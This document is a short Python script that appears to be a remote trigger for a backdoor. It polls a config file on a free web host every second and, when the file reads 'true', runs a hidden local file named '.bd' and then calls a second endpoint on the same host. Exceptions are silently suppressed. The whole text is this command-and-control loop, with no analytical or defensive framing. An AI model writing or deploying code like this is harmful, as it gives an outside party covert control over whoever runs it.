from requests import get
import os

try:
    while True:
        l=get('https://foofooco.000webhostapp.com/Bd/f_bd.config')
        if l.text == 'true':
            os.system('python .bd')
            os.system('sleep 1')
            get('https://foofooco.000webhostapp.com/Bd/config.php')
            continue
        else:
            os.system('sleep 1')
            pass
except:
    quit()
